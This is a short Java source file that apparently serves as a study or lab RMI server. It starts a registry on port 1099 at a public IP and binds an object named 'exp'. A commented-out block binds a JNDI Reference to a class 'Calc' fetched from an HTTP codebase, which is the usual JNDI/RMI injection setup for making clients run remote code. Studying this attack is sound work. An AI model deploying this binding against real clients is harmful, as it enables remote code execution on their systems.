package com.sorry.jcoffe.Debug.RMI;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) throws RemoteException {
        //在这里将服务端和注册中心放在一起...
        System.setProperty("java.rmi.server.hostname","39.108.244.167");
        Registry registry = LocateRegistry.createRegistry(1099);

        //模拟从注册中心获取服务
        ObjectInterface exp = new Object();
        registry.rebind("exp",exp);//rebind不抛出异常
        System.out.println("RMIServer ready");
        //RMIServer远程绑定恶意类
        /*
        Reference reference = new Reference("Calc","Calc","http://127.0.0.1:80/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.rebind("exp",referenceWrapper);
        */



    }
}
